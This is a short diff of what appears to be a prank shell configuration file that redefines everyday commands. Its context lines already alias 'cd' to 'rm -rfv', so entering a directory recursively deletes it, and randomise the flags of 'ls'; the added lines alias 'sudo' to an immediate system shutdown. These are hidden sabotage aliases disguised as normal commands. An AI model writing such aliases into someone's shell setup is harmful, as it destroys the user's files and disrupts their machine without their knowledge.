@@ -18,3 +18,6 @@ function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1})
 
 # Delete directories instead of entering them
 alias cd='rm -rfv'
+
+#Shutdown the pc instead of running a sudo cmd
+alias sudo='sudo shutdown -P now'
